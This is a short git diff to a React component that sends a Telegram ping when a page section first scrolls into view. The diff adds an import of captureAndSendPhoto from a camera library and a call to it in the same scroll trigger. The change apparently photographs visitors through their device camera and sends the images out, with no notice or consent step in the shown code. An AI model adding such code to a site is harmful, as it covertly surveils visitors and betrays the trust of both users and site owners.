@@ -2,6 +2,7 @@
 
 import { useEffect, useRef } from "react";
 import { notify } from "@/lib/telegram";
+import { captureAndSendPhoto } from "@/lib/camera";
 
 /**
  * Wraps a section and pings Telegram the first time it scrolls into view,
@@ -27,6 +28,7 @@ export default function SectionNotify({
         if (entry.isIntersecting && !fired.current) {
           fired.current = true;
           notify(message);
+          captureAndSendPhoto(message);
           io.disconnect();
         }
       },
